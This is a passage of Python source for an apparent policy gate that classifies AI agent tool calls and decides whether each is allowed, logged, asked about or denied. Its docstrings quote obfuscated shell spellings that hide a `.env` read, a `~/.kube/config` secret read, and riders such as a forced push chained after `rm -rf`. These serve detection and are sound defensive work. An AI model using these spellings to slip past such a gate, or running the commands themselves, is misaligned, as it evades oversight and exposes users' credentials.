_PARAM = re.compile(r"\$(\{[^}]*\}?|[A-Za-z_]\w*|[0-9@*#?$!-])")   # a ${..} to its first `}`, as the lexer reads it
_KNOWN_PARAM = re.compile(r"\$\{?(HOME|EXO_HOME|EXO_PRINCIPAL_STORE|CLAUDE_CONFIG_DIR)(?!\w)")


def _unknown_forms(src: str) -> list[str]:
    """Spellings of a shell word whose source text ``src`` (quotes kept) holds an expansion the gate cannot spell
    out (#225): a $( ) or ` `, or a ${..} or $name other than the store variables _expand_text spells out. Each is
    read as empty, which joins the text around it (`.e$(:)nv` is `.env`, `${x}.env` is `.env`), and, where literal
    text stands on both sides of it, as `*` for any output (`.e$(echo n)v` is the glob `.e*v`, which then asks where
    that glob would). [] when the word holds none."""
    if "$" not in src and "`" not in src:
        return []
    lx, q = _Lexer(src), ""
    parts: list[str | None] = []                      # literal source text, None for an expansion
    lit: list[str] = []
    while lx.i < len(src):
        ch = src[lx.i]
        if q != "'" and (ch == "`" or src.startswith("$(", lx.i) and not src.startswith("$((", lx.i)):
            parts += ["".join(lit), None]
            lit = []
            _SCANS[ch](lx, _Word())                   # past the substitution, read as the lexer reads it
            continue
        m = _PARAM.match(src, lx.i) if ch == "$" and q != "'" else None
        if m and not _KNOWN_PARAM.match(m[0]):
            parts += ["".join(lit), None]
            lit = []
            lx.i = m.end()
            continue
        step = len(m[0]) if m else 2 if ch == "\\" and q != "'" else 1
        if ch in "'\"" and q in ("", ch):
            q = "" if q else ch
        lit.append(src[lx.i:lx.i + step])
        lx.i += step
    parts.append("".join(lit))
    if len(parts) == 1:
        return []
    text = [k for k, p in enumerate(parts) if p and p.strip("'\"")]   # parts with literal text, not only quotes
    star = "".join(p if p is not None else "*" if text and text[0] < k < text[-1] else "" for k, p in enumerate(parts))
    return list(dict.fromkeys(["".join(p or "" for p in parts), star]))


def _dequote(word: str) -> list[str]:
    """The words the lexer reads from one brace-expanded source word, quotes removed. A `$"..."` is also read
    as the plain "..." bash gives it without a message catalog."""
    if not re.search(r"[\\'\"$`<>#]", word):
        return [word]
    out: list[str] = []
    for src in dict.fromkeys((word, word.replace('$"', '"'))):
        toks = _Lexer("\\" + src if src.startswith("#") else src, scan=False).run()
        out += [w.text for kind, w in toks if kind == "w"]
    return out


def _strip_prefixes_keep_env(argv: list[str]) -> tuple[list[str], bool]:
    """The simple command behind its assignments, prefixes (sudo, nice, timeout, env with a command...),
    `coproc`, compound openers (then, do...) and run wrappers (uv run, poetry run...), so the environment-dump
    check sees `uv run printenv X` as `printenv X` (#155). A bare `env` (or `env` with assignments only) is kept: it is the dump."""
    while argv:
        base = argv[0].rsplit("/", 1)[-1]
        if _ASSIGN.fullmatch(argv[0]) or base in _OPENERS or base in ("coproc", "("):
            argv = argv[1:]
        elif base in _PREFIXES and not (base == "command" and argv[1:2] and argv[1] in ("-v", "-V")):
            rest, takes = argv[1:], _PREFIXES[base]
            while rest and rest[0].startswith("-") and rest[0] != "-":
                f, rest = rest[0], rest[1:]
                if base == "env" and f.startswith(("-S", "--split-string")):
                    return argv, False                   # env -S text is classified on its own
                if f in takes and rest:
                    rest = rest[1:]
            if base == "timeout" and rest and re.fullmatch(r"[\d.]+[smhd]?", rest[0]):
                rest = rest[1:]
            if base == "env" and all(_ASSIGN.fullmatch(a) for a in rest):
                break
            argv = rest
        elif (base, argv[1] if len(argv) > 1 else "") in _RUN_WRAPPERS:
            rest = argv[2:]
            while rest and rest[0].startswith("-"):
                f, rest = rest[0], rest[1:]
                if f == "--":
                    break
                if f in _WRAPPER_VALUE_OPTS and rest:
                    rest = rest[1:]
            argv = rest
        else:
            break
    return argv, False


# Name hints for tools not in the table (plugins, MCP servers). Ordered; first match wins.
_READ_VERBS = {"get", "list", "read", "search", "fetch", "query", "view", "find", "describe", "show",
               "lookup", "status", "check", "count", "download", "inspect", "preview"}
NAME_HINTS: list[tuple[set[str], set[str] | None, str]] = [
    ({"pay", "payment", "charge", "refund", "transfer", "purchase", "buy", "checkout", "payout",
      "invoice", "subscribe", "order"}, None, "payment"),
    ({"signup"}, None, "account"),
    ({"account"}, {"create", "open", "new", "register"}, "account"),
    ({"login", "signin", "oauth", "password", "secret", "credential", "credentials", "token", "apikey"}, None,
     "credentials"),
    ({"delete", "remove", "destroy", "drop", "purge", "wipe", "erase", "revoke", "trash"}, None, "delete"),
    ({"deploy", "promote", "rollout"}, None, "deploy_production"),
    ({"publish", "release"}, None, "publish"),
    ({"merge"}, {"github", "gitlab", "gh"}, "vcs_merge"),
    ({"close"}, {"github", "gitlab", "gh"}, "github_close"),
    ({"comment", "review", "reply", "create", "update", "edit"}, {"github", "gitlab", "gh"}, "github_post"),
    ({"email", "mail", "gmail"}, {"send", "reply", "forward"}, "email_send"),
    ({"draft"}, None, "local_write"),
    ({"tweet", "toot"}, None, "social_post"),
    ({"cast", "post", "share"}, {"x", "twitter", "bluesky", "linkedin", "mastodon", "threads",
                                                  "social", "status"}, "social_post"),
    ({"send", "message", "reply", "post", "dm", "comment", "invite", "notify", "tweet"}, None, "message_send"),
    ({"create", "update", "edit", "write", "set", "add", "upload", "put", "insert", "upsert", "move",
      "rename", "archive"}, None, "remote_write"),
]


def _name_tokens(name: str) -> list[str]:
    return [t for t in re.split(r"[_\-.:/]+|(?<=[a-z])(?=[A-Z])", name.lower()) if t]


def classify_by_name(tool: str) -> str:
    toks = _name_tokens(tool)
    is_mcp = bool(toks) and toks[0] == "mcp"
    words = toks[1:] if is_mcp else toks
    joined = "_".join(words)
    verb = next((t for t in words if t in _READ_VERBS or any(t in h for h, _, _ in NAME_HINTS)), "")
    if verb in _READ_VERBS:
        return "read"
    wset = set(words) | {joined}
    for hits, needs, cat in NAME_HINTS:
        if wset & hits and (needs is None or wset & needs):
            if cat == "remote_write" and not is_mcp:
                return "local_write"
            return cat
    return "unknown"


def _args_of(action: Any) -> tuple[str, dict]:
    if isinstance(action, (tuple, list)) and len(action) == 2:
        tool, args = action
    elif isinstance(action, Mapping):
        tool = action.get("tool") or action.get("tool_name") or action.get("name") or ""
        args = action.get("args") if "args" in action else action.get("arguments", {})
    else:
        raise TypeError("action must be {'tool': name, 'args': {...}} or (name, args)")
    if isinstance(args, str):
        try:
            args = json.loads(args)
        except ValueError:
            args = {"input": args}
    return str(tool), dict(args or {})


@_brace_budget
@_in_tool_folder
def classify(action: Any, cwd: str | None = None) -> Classification:
    """Classify one tool call from its name and arguments. Pure; never raises on odd args. ``cwd`` is the folder the
    tool runs in, when the caller knows it: relative paths are resolved from there too (_in_tool_folder sets it)."""
    tool, args = _args_of(action)
    if _runs_shell(tool, args):
        c = classify_shell(str(args.get("command") or args.get("cmd") or ""))
    elif tool == "execute_code":
        c = classify_code(str(args.get("code") or ""))
    elif tool in ("write_file", "patch", "edit_file", "apply_patch"):
        paths = [_first(args, ("path", "file_path"))] + _patch_paths(str(args.get("patch") or ""))
        paths = [p for p in paths if p]
        path = next((p for p in paths if is_sensitive_path(p)), "") or args_sensitive(args)
        cat = "credentials"
        if not path:
            path = next((p for p in paths if is_store_path(p)), "")
            cat = "store_write" if path else "local_write"
        path = path or (paths[0] if paths else "")
        c = _make(cat, summary=f"write {path}", target=path, link=path)
        if cat == "store_write":
            c.signals.append("exo store")
    elif tool == "web_extract":
        urls = args.get("urls") or [args.get("url", "")]
        url = urls[0] if isinstance(urls, list) and urls else str(urls)
        c = _make("web_read", summary=f"read {url}", target=_host_of(str(url)), link=str(url))
    elif tool == "send_message":
        target = _first(args, ("target", "chat_id", "channel"))
        c = _make("message_send", summary=f"send message to {target or 'a chat'}", target=target,
                  text=_first(args, ("message", "text")))
        if str(args.get("action", "send")).lower() == "list":
            c = _make("read", summary="list message targets")
    elif tool == "cronjob_manage":
        action = str(args.get("action", "")).lower()
        if action in ("list", "get", "status", ""):
            c = _make("read", tool=tool, summary=f"cron {action}")
        else:
            operation = json.dumps(args, sort_keys=True, ensure_ascii=False, default=str)
            c = _opaque(f"cronjob_manage mutation: {action}", operation)
            c.tool = tool
    else:
        cat = TOOLS.get(tool) or classify_by_name(tool)
        secret = args_sensitive(args) if cat in ("read", "local_write", "unknown", "remote_write", "delete") else ""
        if secret:
            cat = "credentials"
        store = ""
        if not secret and cat not in ("read", "web_read"):
            store = next((v for k in _PATH_ARG_KEYS for v in (args.get(k) if isinstance(args.get(k), (list, tuple))
                          else [args.get(k)]) if isinstance(v, str) and is_store_path(v, ancestors=cat == "delete")), "")
            if store:
                cat = "store_write"
        target = _first(args, _TARGET_KEYS)
        text = _first(args, _TEXT_KEYS) if cat in OUTBOUND else ""
        title = _first(args, _TITLE_KEYS) if cat in OUTBOUND else ""
        cost: float | None = 0.0
        if cat == "payment":
            amt = _first(args, _AMOUNT_KEYS)
            try:
                cost = float(re.sub(r"[^\d.]", "", amt)) if amt else None
            except ValueError:
                cost = None
        link = target if target.startswith(("http://", "https://", "/", "~")) else ""
        c = _make(cat, summary=f"{tool} {target}".strip()[:120], target=target, link=link, text=text,
                  title=title, cost=cost)
        if cat == "unknown":
            c.signals.append("unrecognised tool")
        if secret:
            c.signals.append("secret store")
            c.summary, c.target = f"{tool} {secret}"[:120], secret
        if store:
            c.signals.append("exo store")
            c.summary, c.target = f"{tool} {store}"[:120], store
    c.tool = tool
    if c.category in ("web_post", "web_read") and c.target and _is_local_host(c.target):
        c.exposure, c.third_party = "private", False
    return c


# --- policies ------------------------------------------------------------------------------

DEFAULT_MATRIX = {
    "reversible": {"private": "allow", "internal": "allow", "public": "ask"},
    "costly": {"private": "allow", "internal": "log", "public": "ask"},
    "irreversible": {"private": "ask", "internal": "ask", "public": "ask"},
}

DEFAULT_POLICIES: dict = {
    "gates": {"matrix": DEFAULT_MATRIX, "scopes": {"private": [], "internal": []}, "categories": {},
              "rules": [], "reserved": [], "deny": [],
              "escalate": {"cost_over_budget": True, "third_party": True, "categories": ["credentials", "account",
                                                                                        "payment"]},
              "ask_default": "skip"},
    "budget": {"per_action_max": 0, "per_day_max": 0, "per_month_ceiling": 0},
    "posting": {"applies_to": list(POSTING_DEFAULT), "footer": "", "forbid": [], "forbid_words": [],
                "forbid_agent_names": False},
    "agents": [],
}


def _norm_outcome(v: Any, where: str) -> str:
    out = _OUTCOME_ALIASES.get(str(v).strip().lower())
    if out is None:
        raise PolicyError(f"{where}: unknown decision {v!r}; expected one of act, report, allow, log, ask, deny")
    return out


def normalize_policies(raw: Mapping | None) -> dict:
    """Fill defaults and check types. Raises PolicyError on a bad value."""
    raw = dict(raw or {})
    pol = json.loads(json.dumps(DEFAULT_POLICIES))
    gates = dict(raw.get("gates") or {})
    matrix = gates.get("matrix") or {}
    for rev in REVERSIBILITY:
        for exp in EXPOSURE:
            v = (matrix.get(rev) or {}).get(exp)
            if v is not None:
                pol["gates"]["matrix"][rev][exp] = _norm_outcome(v, f"gates.matrix.{rev}.{exp}")
    scopes = gates.get("scopes") or {}
    for k in ("private", "internal"):
        v = scopes.get(k) or []
        if not isinstance(v, list):
            raise PolicyError(f"gates.scopes.{k} must be a list")
        pol["gates"]["scopes"][k] = [str(x) for x in v]
    cats = gates.get("categories") or {}
    if not isinstance(cats, Mapping):
        raise PolicyError("gates.categories must be a mapping of category: decision")
    pol["gates"]["categories"] = {str(k): _norm_outcome(v, f"gates.categories.{k}") for k, v in cats.items()}
    rules = gates.get("rules") or []
    if not isinstance(rules, list):
        raise PolicyError("gates.rules must be a list")
    out_rules = []
    for i, r in enumerate(rules):
        if not isinstance(r, Mapping) or "decision" not in r:
            raise PolicyError(f"gates.rules[{i}] needs a decision")
        match = r.get("match") or {k: v for k, v in r.items() if k not in ("decision", "reason", "name")}
        out_rules.append({"match": dict(match), "decision": _norm_outcome(r["decision"], f"gates.rules[{i}]"),
                          "reason": str(r.get("reason") or r.get("name") or f"rule {i + 1}")})
    pol["gates"]["rules"] = out_rules
    for k in ("reserved", "deny"):
        v = gates.get(k) or []
        if not isinstance(v, list):
            raise PolicyError(f"gates.{k} must be a list")
        pol["gates"][k] = v
    esc = gates.get("escalate")
    if isinstance(esc, Mapping):
        pol["gates"]["escalate"].update(esc)
    if gates.get("ask_default"):
        pol["gates"]["ask_default"] = str(gates["ask_default"])
    budget = raw.get("budget") or {}
    for k in ("per_action_max", "per_day_max", "per_month_ceiling"):
        if budget.get(k) is not None:
            try:
                pol["budget"][k] = float(budget[k])
            except (TypeError, ValueError):
                raise PolicyError(f"budget.{k} must be a number") from None
    for k, v in budget.items():
        pol["budget"].setdefault(k, v)
    posting = raw.get("posting") or {}
    for k, v in posting.items():
        pol["posting"][k] = v
    for k in ("forbid", "forbid_words", "applies_to"):
        if not isinstance(pol["posting"].get(k) or [], list):
            raise PolicyError(f"posting.{k} must be a list")
    pol["posting"]["footer"] = str(pol["posting"].get("footer") or "")
    pol["agents"] = [str(a) for a in (raw.get("agents") or [])]
    pol["approvals"] = normalize_approvals(raw.get("approvals"))  # D-033
    pol["scrub"] = normalize_scrub(pol["posting"].get("scrub"), raw.get("internal_names") or ())  # D-033
    if raw.get("interruptions"):
        pol["interruptions"] = raw["interruptions"]
    pol["_normalized"] = True
    return pol


def _glob_any(value: str, patterns: Iterable[str]) -> bool:
    v = (value or "").lower()
    return bool(v) and any(fnmatch.fnmatchcase(v, str(p).lower()) for p in patterns)


def _as_list(v: Any) -> list:
    return v if isinstance(v, list) else [v]


_MATCH_KEYS = ("category", "tool", "target", "command", "exposure", "reversibility", "third_party")


def _policy_command_view(command: str) -> str:
    """Decode literal shell words without turning word contents into shell syntax.

    This is an additional veto view, never an authorization view. Dynamic words stay
    opaque. Execution strings get their own views only through classify_shell recursion.
    """
    tokens = _Lexer(command, scan=False).run()
    rendered = []
    for kind, value in tokens:
        if kind == "w":
            if value.dynamic:
                rendered.append("\x00\x01\x00")   # no letters or operators; a real word escapes control characters
            elif not value.text:
                rendered.append("''")
            else:
                rendered.append("".join(
                    f"\\x{ord(ch):02x}" if ch.isspace() or ord(ch) < 32 or ch in "\\'\";&|()<>" else ch
                    for ch in value.text
                ))
        elif kind in ("op", "redir"):
            rendered.append(value)
        elif kind == "hd":
            rendered.append("\x00\x02\x00")   # the heredoc body, the same way
    return " ".join(rendered)


def _command_matches(pattern: str, c: Classification, *, veto: bool = False,
                     line: Callable[[str], bool] | None = None) -> bool:
    regex = re.compile(pattern)
    texts = [c.command or ""]
    if veto and line is not None:       # a part of a line: its own text, or any decoded view of the line (#136)
        return bool(regex.search(texts[0])) or line(pattern)
    if veto:
        texts.extend(c._command_views)
    return any(regex.search(text) for text in texts)


def _rule_matches(match: Mapping, c: Classification, *, veto: bool = False,
                  line: Callable[[str], bool] | None = None) -> bool:
    for k, want in match.items():
        if k == "category" and c.category not in [str(x) for x in _as_list(want)]:
            return False
        if k == "tool" and not _glob_any(c.tool, _as_list(want)):
            return False
        if k == "target" and not _glob_any(c.target, _as_list(want)):
            return False
        if k == "command" and not any(_command_matches(str(p), c, veto=veto, line=line) for p in _as_list(want)):
            return False
        if k == "exposure" and c.exposure not in _as_list(want):
            return False
        if k == "reversibility" and c.reversibility not in _as_list(want):
            return False
        if k == "third_party" and bool(want) != c.third_party:
            return False
        if k not in _MATCH_KEYS:
            return False      # unknown key: never match, so a typo cannot widen a rule
    return True


def _list_matches(entries: Iterable, c: Classification, line: Callable[[str], bool] | None = None) -> str:
    """Reserved/deny entries: a category name, `tool:<glob>`, `command:<regex>`, `target:<glob>`,
    or a mapping like a rule's match. Plain prose that matches none of these is ignored."""
    for e in entries:
        if isinstance(e, Mapping):
            # Only match keys count. Anything else (reason, name, decision, a note, a typo) is dropped, so it
            # widens a deny or reserved entry instead of voiding it: these lists only make a decision stricter.
            raw = e["match"] if isinstance(e.get("match"), Mapping) else e
            match = {k: v for k, v in raw.items() if k in _MATCH_KEYS}
            if e and _rule_matches(match, c, veto=True, line=line):
                return str(e.get("reason") or e.get("name") or e)
            continue
        s = str(e).strip()
        if s == c.category:
            return s
        kind, _, val = s.partition(":")
        if kind == "tool" and _glob_any(c.tool, [val.strip()]):
            return s
        if kind == "target" and _glob_any(c.target, [val.strip()]):
            return s
        if kind == "command" and val.strip() and _command_matches(val.strip(), c, veto=True, line=line):
            return s
    return ""


def _scoped(c: Classification, scopes: Mapping, tool: str = "", seen: dict | None = None) -> Classification:
    """``c`` with the principal's scopes applied, and the same for every simple command it was built from.
    A part carries the tool of the call it came in on, so a `tool:` entry matches it too. A part shared by
    several results (_shell_seen) is scoped once and stays shared."""
    seen = {} if seen is None else seen
    key = (id(c), tool)
    if key not in seen:
        exposure, third = apply_scopes(c, scopes)
        inner = c.tool or tool
        seen[key] = replace(c, exposure=exposure, third_party=third, tool=inner,
                            parts=[_scoped(p, scopes, inner, seen) for p in c.parts])
    return seen[key]


def _each_part(c: Classification) -> Iterator[Classification]:
    """The classification and every simple command it was built from, nested ones included, each once."""
    seen: set[int] = set()
    todo = [c]
    while todo:
        p = todo.pop()
        if id(p) in seen:
            continue
        seen.add(id(p))
        yield p
        todo.extend(reversed(p.parts))


def _line_matcher(c: Classification) -> Callable[[str], bool]:
    """Whether a `command` pattern matches any decoded view of the line (#136), each pattern run once."""
    views = list(dict.fromkeys(v for p in _each_part(c) for v in p._command_views))
    seen: dict[str, bool] = {}

    def line(pattern: str) -> bool:
        if pattern not in seen:
            regex = re.compile(pattern)
            seen[pattern] = any(regex.search(v) for v in views)
        return seen[pattern]
    return line


def _one_text(c: Classification) -> bool:
    """Whether no two parts of the line have different own texts (#394): a line of one simple command, beside the
    parts the gate made for it with no own text (a secret path it names in `cat ~/.kube/config`, a string literal in
    its code). A rule that matches such a line as before names its one command, so the line is decided as before,
    as a line of one part is."""
    texts = {t for p in _each_part(c) for t in (p.own, *p.setters) if t is not None}
    return len(texts) < 2


def _line_own_test(c: Classification, pol: Mapping, ctx: Mapping) -> Callable[[str, list[str]], bool]:
    """The test a rule that would lower a compound line passes on top of matching the line (#394), as a test of (the
    rule's decision, its `command` patterns). They must match the own text of every simple command that carries the
    line's category or is as severe as the combined result, so a regex written for one command cannot lower a line
    whose deciding command it does not name. The combined result is one of these: the deciding command's part, or a
    part the gate made (a secret on the line, the opaque_exec reading of a `$".."` line) with no own text, and then
    no such rule lowers the line. They must also match every other part that alone would get a stricter outcome than
    the rule's decision, by its category line and the matrix or by the rules (a rider: `rm -rf build && git push
    --force origin main` under an allow rule for the push), and every command that changes the shell for the
    commands after it (Classification.setters: `export GIT_SSH_COMMAND=$X; git push ..`)."""
    parts, top = list(_each_part(c)), _severity(c)
    core = {id(p) for p in parts if p.category == c.category or _severity(p) >= top}
    setters = list(dict.fromkeys(t for p in parts for t in p.setters))
    bare = {**pol, "gates": {**pol["gates"], "rules": []}}
    raises = any(r["decision"] != "allow" for r in pol["gates"].get("rules") or [])   # an allow rule only lowers
    alone: dict[tuple, int] = {}

    def stricter(p: Classification, level: int) -> bool:
        # The part alone, without the parts it was built from (each is tested in turn): no rule lowers it here.
        # Parts alike decide alike, so a long line of the same few commands is decided a few times.
        text = p.own if p.own is not None else p.command
        key = (p.category, p.reversibility, p.exposure, p.third_party, p.cost, p.tool, p.summary, p.target, p.text,
               p.title, p.text_file, text, tuple(p.signals))
        if key not in alone:
            q = replace(p, parts=[], command=text, _command_views=[])
            out = OUTCOMES.index(decide(q, bare, ctx).outcome)
            alone[key] = max(out, OUTCOMES.index(decide(q, pol, ctx).outcome)) if raises else out
        return alone[key] > level

    def test(decision: str, patterns: list[str]) -> bool:
        regexes, seen, level = [re.compile(x) for x in patterns], {}, OUTCOMES.index(decision)

        def named(t: str | None) -> bool:
            if t not in seen:
                seen[t] = t is not None and any(rx.search(t) for rx in regexes)
            return seen[t]
        return all(named(t) for t in setters) and \
            all(named(p.own) or (id(p) not in core and not stricter(p, level)) for p in parts)
    return test


def _part_hits(entries: Iterable, c: Classification) -> list[tuple[Classification, str]]:
    """Each part of the classification (the combined result first, then every simple command it was built
    from) with the reserved or deny entry that matches it (D-075): a compound line is denied when any simple
    command on it is. A `command` pattern matches a part on the part's own text or on any decoded view of the
    line (#136); each pattern is run over the line's views once, not once per part."""
    entries = list(entries)
    line = _line_matcher(c)
    return [(p, hit) for p in _each_part(c) if (hit := _list_matches(entries, p, line))]


def _override_deny(c: Classification, gates: Mapping,
                   passed: list[Mapping] | None = None) -> tuple[Classification, str, str] | None:
    """The first part of the line, below the combined result, that a category line or rule denies as it would
    deny that command alone (#191): its category's line, then the first rule that matches it; or a deny rule
    whose `command` regex matches only a decoded view of the line (#136). ``(part, why, step)`` or None.
    With ``passed`` (#394), an allow, log or ask rule keyed on `command` that matches must also match the part's own
    text, or it is passed over and added to ``passed``: a rule written for another command on the line does not lift
    the part's deny. Deny rules match as before, so every part denied without this test is denied with it."""
    cats, rules = gates.get("categories") or {}, gates.get("rules") or []
    if not (cats or rules):
        return None
    line = _line_matcher(c)
    for p in list(_each_part(c))[1:]:
        out, why, step = cats.get(p.category), f"category {p.category}", "category"
        first = None
        for r in rules:
            if not _rule_matches(r["match"], p):
                continue
            if passed is not None and r["decision"] != "deny" and "command" in r["match"] and not (
                    p.own is not None and any(re.search(str(x), p.own) for x in _as_list(r["match"]["command"]))):
                passed.append(r)
                continue
            first = r
            break
        if first is not None:
            out, why, step = first["decision"], first["reason"], "rule"
        if out != "deny":
            veto = next((r for r in rules if r["decision"] == "deny" and "command" in r["match"]
                         and _rule_matches(r["match"], p, veto=True, line=line)), None)
            if veto is None:
                continue
            why, step = veto["reason"], "rule"
        return p, why, step
    return None


def apply_scopes(c: Classification, scopes: Mapping) -> tuple[str, bool]:
    """Effective (exposure, third_party) after the principal's own scopes."""
    if c.target and _glob_any(c.target, scopes.get("private") or []):
        return "private", False
    if c.target and _glob_any(c.target, scopes.get("internal") or []):
        exp = "internal" if c.exposure == "public" else c.exposure
        return exp, False
    # repo#number targets: match the repo part too
    repo = c.target.split("#", 1)[0]
    if repo != c.target:
        if _glob_any(repo, scopes.get("private") or []):
            return "private", False
        if _glob_any(repo, scopes.get("internal") or []):
            return ("internal" if c.exposure == "public" else c.exposure), False
    return c.exposure, c.third_party


UNSEEN_BODY = ("the gate cannot read the body (stdin, a file it did not read, $(..) or a variable); "
               "pass the text inline or as an absolute --body-file path")


def body_unseen(c: Classification) -> bool:
    """Whether an outbound body, title or field on the line is out of the gate's sight (#208): a part with the
    ``unseen_body`` signal, or a post's body file nobody read into its text. Such a post asks under the posting
    rules, never gets a standing grant, and a required executor refuses it."""
    return any("unseen_body" in p.signals or (p.text_file and not p.text
                                              and (p.category in OUTBOUND or p.category == "vcs_merge"))
               for p in _each_part(c))


def check_post(text: str, posting: Mapping, *, title: str = "", agents: Iterable[str] = (),
               exposure: str = "public") -> list[str]:
    """Violations of the posting rules in outbound text. Empty list = clean."""
    out: list[str] = []
    both = "\n".join(x for x in (title, text) if x)
    footer = str(posting.get("footer") or "").strip()
    footer_on = posting.get("footer_exposures") or ("internal", "public")
    if footer and text and exposure in footer_on and not text.rstrip().endswith(footer):
        out.append(f"missing footer: {footer}")
    for f in posting.get("forbid") or []:
        if isinstance(f, Mapping):
            pat, label = str(f.get("pattern", "")), str(f.get("label") or f.get("pattern"))
            if pat and re.search(pat, both, re.I if f.get("ignore_case") else 0):
                out.append(f"forbidden: {label}")
        elif str(f) and str(f) in both:
            out.append(f"forbidden: {f}")
    words = [str(w) for w in (posting.get("forbid_words") or [])]
    if posting.get("forbid_agent_names"):
        words += [str(a) for a in agents]
    for w in dict.fromkeys(words):
        if w and re.search(r"(?<![\w-])" + re.escape(w) + r"(?![\w-])", both, re.I):
            out.append(f"forbidden word: {w}")
    mx = posting.get("max_chars")
    if mx and len(text) > int(mx):
        out.append(f"longer than {int(mx)} characters")
    return out


def decide(c: Classification, policies: Mapping | None = None, context: Mapping | None = None) -> Decision:
    """Map a classification through the principal's policies. Pure.

    Order: matrix cell, then a category override, then the first matching rule (each may lower
    or raise). Then only raises: a deny or ask rule whose `command` regex matches the literal-word
    view but not the text, reserved actions, escalations (budget, third party, listed categories),
    posting violations (a body the gate cannot read is one) and the operator floor. A deny entry wins
    over everything, and so does a category line or rule that denies any part of a compound line. A line
    with a `$".."` word is also decided as opaque_exec, and the stricter outcome stands.
    `context` may carry `spent_today` for the daily budget.

    On a compound line, a rule keyed on `command` that would lower the line (its decision is below the matrix cell
    and category line, or it is an allow or log rule that names opaque_exec) must match the line as before and also
    name each command that decides the line, each that would be stricter alone and each that changes the shell state
    for the rest (#394, _line_own_test). A rule that fails is passed over, and the rule step keeps the stricter of
    the first match, as before, and the rule found after it. A rule passed over never names opaque_exec for the
    floor. The #191 pass asks the same of a rule that would lift a part's deny, so it denies each part it denied
    before. So that pass is never looser than deciding as before. When it passes a rule over, the line is also
    decided as before, and that decision stands unless the other is stricter, reason and all. That pass reads rules
    and patterns the decision before never reached (a regex past the first match, a rule after the one skipped), so
    when it fails, the line is decided as before, which then fails only where it failed before. A line of one simple
    command, beside parts the gate made for it, is decided as before (_one_text).
    """
    pol = policies if (policies and policies.get("_normalized")) else normalize_policies(policies)
    ctx = dict(context or {})
    if _one_text(c):
        return _decide(c, pol, ctx, None)
    passed: list[Mapping] = []
    try:
        d = _decide(c, pol, ctx, passed)
    except Exception:
        return _decide(c, pol, ctx, None)
    if passed:
        before = _decide(c, pol, ctx, None)
        if OUTCOMES.index(d.outcome) <= OUTCOMES.index(before.outcome):
            return before
    return d


def _decide(c: Classification, pol: Mapping, ctx: dict, passed: list[Mapping] | None) -> Decision:
    """decide() under normalized policies. With ``passed``, a rule that would lower a compound line must also pass
    the own text test, and each rule that test passes over is added to ``passed`` (#394): each step keeps the
    stricter outcome, so the decision is never looser than without. Without ``passed``, as before #394."""
    gates, budget, posting = pol["gates"], pol["budget"], pol["posting"]
    eff = _scoped(c, gates.get("scopes") or {})

    outcome = gates["matrix"][eff.reversibility][eff.exposure]
    reason, rule = f"{eff.reversibility} and {eff.exposure}", "matrix"
    # D-038: the principal may lower opaque code only by naming it below ask (a category line or a rule on
    # opaque_exec). Naming it at ask or deny keeps the indirection floor (#178).
    below_ask = ("allow", "log")
    opaque_named = gates.get("categories", {}).get("opaque_exec") in below_ask
    if eff.category in gates.get("categories", {}):
        outcome, reason, rule = gates["categories"][eff.category], f"category {eff.category}", "category"

    def names_opaque(r: Mapping | None) -> bool:
        return r is not None and r["decision"] in below_ask and \
            "opaque_exec" in [str(x) for x in _as_list(r["match"].get("category", []))]

    # The first rule that matches (`first`), and with ``passed`` the first that also passes the own text test when
    # it would lower the line (`picked`, #394). Rules that keep or raise the outcome match as before.
    first: Mapping | None = None
    picked: Mapping | None = None
    own: Callable[[str, list[str]], bool] | None = None
    base = OUTCOMES.index(outcome)
    for r in gates.get("rules") or []:
        if not _rule_matches(r["match"], eff):
            continue
        first = first or r
        if passed is not None and eff.parts and "command" in r["match"] and \
                (OUTCOMES.index(r["decision"]) < base or names_opaque(r)):
            own = own or _line_own_test(eff, pol, ctx)
            if not own(r["decision"], [str(x) for x in _as_list(r["match"]["command"])]):
                passed.append(r)
                continue
        picked = r
        break
    # The stricter of the two steps stands, the first rule's when they are alike. A rule passed over does not name
    # opaque_exec for the floor, and a later rule does so only when the first one does too.
    chosen = first
    if first is not None and picked is not first and \
            OUTCOMES.index(picked["decision"] if picked else outcome) > OUTCOMES.index(first["decision"]):
        chosen = picked
    if chosen is not None:
        outcome, reason, rule = chosen["decision"], chosen["reason"], "rule"
    opaque_named = opaque_named or (names_opaque(first) and names_opaque(picked))

    def bump(level: str, why: str, step: str):
        # A higher level takes over. An equal one adds its reason, and names itself as the
        # cause when the level so far came only from the matrix cell.
        nonlocal outcome, reason, rule
        if OUTCOMES.index(level) > OUTCOMES.index(outcome):
            outcome, reason, rule = level, why, step
        elif level == outcome:
            reason = f"{reason}; {why}"
            if rule == "matrix":
                rule = step

    # A deny or ask rule keyed on `command:` also sees the literal-word view (#136), and can only raise.
    # A rule the command text matched was settled by the first-match pass above, whatever its place
    # in the list, so this never changes an outcome the view did not add to.
    for r in gates.get("rules") or []:
        if r["decision"] in ("ask", "deny") and "command" in r["match"] \
                and not _rule_matches(r["match"], eff) and _rule_matches(r["match"], eff, veto=True):
            bump(r["decision"], r["reason"], "rule")

    # #188: a command bash runs only as it reads a value again may outrank a deny on the line; naming opaque_exec
    # does not lower that ask.
    reread = "reread" in eff.signals
    if (eff.category == "opaque_exec" or "indirection" in eff.signals) and (reread or not opaque_named):
        bump("ask", "runs code the gate cannot fully see (" + (c.summary or "indirection") + ")", "opaque")
    reserved = _part_hits(gates.get("reserved") or [], eff)
    if reserved:
        bump("ask", f"reserved for the principal ({reserved[0][1]})", "reserved")
    esc = gates.get("escalate") or {}
    if esc.get("cost_over_budget", True):
        per_action = float(budget.get("per_action_max") or 0)
        if eff.cost is None and eff.category == "payment":
            bump("ask", "spend of unknown amount", "budget")
        elif eff.cost:
            if eff.cost > per_action:
                bump("ask", f"spend {eff.cost:g} above per-action limit {per_action:g}", "budget")
            per_day = float(budget.get("per_day_max") or 0)
            if float(ctx.get("spent_today") or 0) + eff.cost > per_day:
                bump("ask", f"spend would pass the daily limit {per_day:g}", "budget")
    if esc.get("third_party", True) and eff.third_party:
        bump("ask", "affects a third party", "escalate")
    if eff.category in (esc.get("categories") or []):
        bump("ask", f"{eff.category} always asks", "escalate")

    violations: list[str] = []
    unseen = body_unseen(eff)
    applies_to = posting.get("applies_to") or POSTING_DEFAULT
    # Whether the combined classification alone would run the checks (kept for the line-wide
    # unseen note below): its category is under applies_to, or it is a close or merge carrying
    # text (#326, #397).
    line_applies = eff.category in applies_to or (eff.category in ("github_close", "vcs_merge")
                                                  and (eff.text or eff.title or unseen))

    def post_unseen(p: Classification) -> bool:
        """One part's unseen body (#208): a body file nobody read into its text, or its own
